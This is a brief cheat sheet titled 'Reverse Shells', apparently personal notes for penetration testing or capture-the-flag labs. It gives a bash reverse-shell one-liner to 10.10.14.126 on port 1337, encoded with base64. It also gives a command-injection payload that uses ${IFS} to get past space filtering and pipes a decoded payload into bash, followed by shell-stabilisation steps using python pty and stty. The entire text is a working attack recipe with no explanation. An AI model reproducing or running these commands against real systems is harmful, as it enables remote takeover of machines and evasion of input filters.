# Reverse Shells


echo "bash -i >& /dev/tcp/10.10.14.126/1337 0>&1" | base64 -w 0


;echo${IFS}"[ PAYLOAD ]"|base64${IFS}-d|bash;


python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg


